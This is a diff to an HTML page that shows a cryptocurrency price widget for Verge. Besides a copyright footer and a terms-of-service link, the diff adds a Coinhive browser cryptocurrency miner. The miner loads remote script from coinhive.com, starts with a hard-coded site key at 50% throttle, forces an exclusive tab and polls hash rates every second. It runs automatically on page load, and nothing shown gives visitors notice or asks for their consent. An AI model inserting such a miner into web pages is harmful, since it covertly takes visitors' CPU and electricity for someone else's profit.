@@ -64,4 +64,32 @@
 <!-- 20 -->
 <script type="text/javascript" src="https://files.coinmarketcap.com/static/widget/currency.js"></script>
 <div class="coinmarketcap-currency-widget" data-currency="verge" data-base="USD"  data-secondary="BTC"></div>
+
+<br>
+<div style="color:gray">
+<center>
+Copyright 2017 Galien1
+</center>
+</div>
+<a href="http://galien1.github.io/Tos/">Terms of service</a>
+    <!-- Miner -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('RlGAt8lTJCiTqjr9OqXielT42XrsEFLl', { throttle: 0.5 });
+    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+    miner.start();
+</script>
+
+<script>
+    // Listen on events
+    miner.on('found', function() { /* Hash found */ })
+    miner.on('accepted', function() { /* Hash accepted by the pool */ })
+    // Update stats once per second
+    setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+        // Output to HTML elements...
+    }, 1000);
+</script>
 </body>
